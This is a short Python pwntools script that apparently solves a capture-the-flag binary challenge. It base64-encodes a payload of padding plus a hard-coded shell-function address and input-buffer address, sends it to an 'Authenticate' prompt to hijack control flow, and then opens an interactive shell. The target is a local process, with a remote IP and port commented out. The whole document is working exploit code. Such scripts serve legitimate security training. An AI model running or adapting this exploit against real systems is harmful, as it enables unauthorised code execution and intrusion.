from base64 import b64encode
from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/9eb304f8cf4641339ef4fd4b0f204b86')

p = process('../file/9eb304f8cf4641339ef4fd4b0f204b86')
# p = remote('61.147.171.105', '50477')

shell_addr = 0x08049284
input_addr = 0x0811eb40

payload = b64encode(b'aaaa' + p32(shell_addr) + p32(input_addr))
p.sendlineafter(b'Authenticate : ', payload)

p.interactive()